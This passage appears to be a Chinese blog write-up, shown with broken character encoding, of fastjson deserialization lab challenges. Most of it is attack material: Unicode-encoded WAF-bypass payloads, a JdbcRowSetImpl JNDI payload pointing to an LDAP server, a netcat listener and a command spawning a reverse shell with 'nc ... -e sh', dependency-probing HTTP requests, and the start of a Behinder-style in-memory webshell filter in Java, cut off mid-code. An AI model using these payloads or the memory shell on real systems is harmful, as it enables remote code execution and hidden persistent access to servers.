<h3 id="æ£€æµ‹fastjsonç²¾ç¡®ç‰ˆæœ¬"><a href="#æ£€æµ‹fastjsonç²¾ç¡®ç‰ˆæœ¬" class="headerlink" title="æ£€æµ‹fastjsonç²¾ç¡®ç‰ˆæœ¬"></a>æ£€æµ‹fastjsonç²¾ç¡®ç‰ˆæœ¬</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/direct/b81072e29e524bc485f2f47c28b3e562.png" alt="123"><br>ä»æŠ¥é”™ä¿¡æ¯çœ‹å‡ºæ¥è¢«æ‹¦æˆªäº†ï¼Œæ ¹æ®é¡¹ç›®æ–‡ä»¶å¯ä»¥çŸ¥é“è¿‡æ»¤çš„å­—ç¬¦ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/direct/7a71c623ed304f31bc1aba470e4a17c2.png" alt="æœ¬èº«"><br>fastjsonæœ¬èº«æ˜¯é»˜è®¤è¯†åˆ«å¹¶ç¼–ç hexå’ŒUnicodeç¼–ç çš„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œç»•è¿‡ã€‚<br>å°†æ•°æ®è¿›è¡ŒUnicodeç¼–ç </p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>å¾—åˆ°äº†å…·ä½“ç‰ˆæœ¬ï¼š<br><img src="https://img-blog.csdnimg.cn/direct/37f83cba0d404094beeba4b390a2019d.png" alt="123"></p>
<p>ç„¶åæŒ‰ç…§ä¸Šé¢çš„payloadï¼Œåªéœ€è¿›è¡Œä¸€ä¸‹Unicodeç¼–ç å³å¯</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/qz9noe"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"\u0061"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0076\u0061\u006C"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"\u0062"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065"</span><span class="token operator">:</span><span class="token string">"\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0031\u0032\u0033\u002E\u0036\u0030\u002E\u0031\u0035\u0037\u002E\u0031\u0039\u0034\u003A\u0031\u0033\u0038\u0039\u002F\u0071\u007A\u0039\u006E\u006F\u0065"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ”»å‡»æœºå¼€å¯ç›‘å¬ç«¯å£</p>
<blockquote>
<p>root@n0rt6:~# nc -lnvp 9999</p>
</blockquote>
<p>ä½¿ç”¨<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>å¼€å¯æœåŠ¡:</p>
<blockquote>
<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 123.60.157.194 -C â€œnc 123.60.157.194 9999 -e shâ€</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/2d8acba4072d4c879ea4ab10af91e135.png" alt="123"></p>
<h2 id="1247-waf-c3p0ï¼ˆä¸å‡ºç½‘ï¼‰"><a href="#1247-waf-c3p0ï¼ˆä¸å‡ºç½‘ï¼‰" class="headerlink" title="1247-waf-c3p0ï¼ˆä¸å‡ºç½‘ï¼‰"></a>1247-waf-c3p0ï¼ˆä¸å‡ºç½‘ï¼‰</h2><p>æ£€æµ‹æ˜¯å¦æ˜¯fastjson<br>dnslogæµ‹è¯•<br><img src="https://img-blog.csdnimg.cn/direct/53df35833bc04995aa2c060a77358560.png" alt="123"><br>æ¢æµ‹fastjsonç‰ˆæœ¬<br><img src="https://img-blog.csdnimg.cn/direct/4c995cb6fab94fec9d20e7f9b53bb337.png" alt="123"><br>çˆ†å‡ºçš„ç‰ˆæœ¬ä¸º1.2.47ï¼Œåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸‹fastjsonå­˜åœ¨mappingsç¼“å­˜é€šæ€ç»•è¿‡ï¼Œåˆ©ç”¨æ–¹å¼ä¸ºjndi</p>
<h3 id="jndiåˆ©ç”¨æ¡ä»¶"><a href="#jndiåˆ©ç”¨æ¡ä»¶" class="headerlink" title="jndiåˆ©ç”¨æ¡ä»¶"></a>jndiåˆ©ç”¨æ¡ä»¶</h3><p>1ã€ç¯å¢ƒä¸€èˆ¬å‡ºç½‘<br>2ã€æ”¶åˆ°JDKç‰ˆæœ¬é™åˆ¶ï¼ŒJDK8u191åå—åˆ°trusturlcodebaseé™åˆ¶äº†è¿œç¨‹åŠ è½½ï¼Œå½“ç„¶è¿˜æœ‰ç»•è¿‡æ–¹æ³•ã€‚</p>
<p>è¿™å°é¶æœºä¸å‡ºç½‘ï¼Œå› æ­¤JNDIæ³¨å…¥ä¸åˆé€‚</p>
<p><img src="https://img-blog.csdnimg.cn/direct/e9f3324d282145459da43ecb64c887c1.png" alt="13"></p>
<p>ä¸‹ä¸€æ­¥æ¢æµ‹å­˜åœ¨çš„ä¾èµ–ï¼š<strong>åˆ©ç”¨Characterè½¬æ¢æŠ¥é”™å¯ä»¥åˆ¤æ–­å­˜åœ¨å“ªç§ä¾èµ–</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /login HTTP/1.1
Host: 123.60.157.194
Content-Length: 127
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://123.60.157.194
Referer: http://123.60.157.194/tologin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

&#123;"x":&#123;"@type":"java.lang.Character"&#123;"@type":"java.lang.Class","val":"org.springframework.web.bind.annotation.RequestMapping"&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">HTTP/1.1 500 
Server: nginx/1.15.12
Date: Thu, 28 Mar 2024 15:37:12 GMT
Content-Type: application/json
Connection: close
Content-Length: 212

&#123;"timestamp":"2024-03-28T15:37:12.688+0000","status":500,"error":"Internal Server Error","message":"can not cast to char, value : interface org.springframework.web.bind.annotation.RequestMapping","path":"/login"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>RequestMapping</code>æœ¬èº«ä¸ºSpringBootä¸‹çš„ç±»ï¼Œå½“å­˜åœ¨è¯¥ç±»æ—¶ä¼šçˆ†å‡ºç±»å‹è½¬æ¢é”™è¯¯ï¼Œè¯´æ˜ä¸ºSpingBooté¡¹ç›®ã€‚<br>å¦åˆ™æ— æ˜¾ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/direct/3abf7d9a95f04a0c8c245a4823dc9a2b.png" alt="123"><br>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å°è¯•fastjsonåˆ©ç”¨é“¾pocæ‰€éœ€è¦çš„ä¾èµ–ç±»<br><img src="https://img-blog.csdnimg.cn/direct/e41ac08321b34bd2a5a6e162655f816f.png" alt="132"></p>
<p>ä¸‹é¢çœŸçš„ä¸ä¼šäº†<a href="https://github.com/lemono0/FastJsonParty/blob/main/1247-waf-c3p0/write-up.md">æŸ¥çœ‹èµ„æ–™</a>è¿›è¡Œå¤ç°å§ğŸ¥±<br>æ›´æ”¹ä¸€ä¸ªå†°èçš„å†…å­˜é©¬ç¼–è¯‘ä¸ºFRain.javaæ–‡ä»¶ç¼–è¯‘ä¸ºclassæ–‡ä»¶ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//FRain.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">SecretKeySpec</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">DispatcherType</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpSession</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">ApplicationFilterConfig</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">StandardContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">WebappClassLoaderBase</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterDef</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>descriptor<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">FilterMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span><span class="token class-name">BASE64Decoder</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IceShell</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> pa <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">HttpServletRequest</span> request <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span>servletRequest<span class="token punctuation">;</span>
        <span class="token class-name">HttpServletResponse</span> response <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">)</span>servletResponse<span class="token punctuation">;</span>
        <span class="token class-name">HttpSession</span> session <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> pageContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pageContext<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"response"</span><span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ClassLoader</span> cl <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Class</span> <span class="token class-name">Lclass</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Lclass</span> <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RushThere</span><span class="token punctuation">(</span><span class="token class-name">Lclass</span><span class="token punctuation">,</span> cl<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.ClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
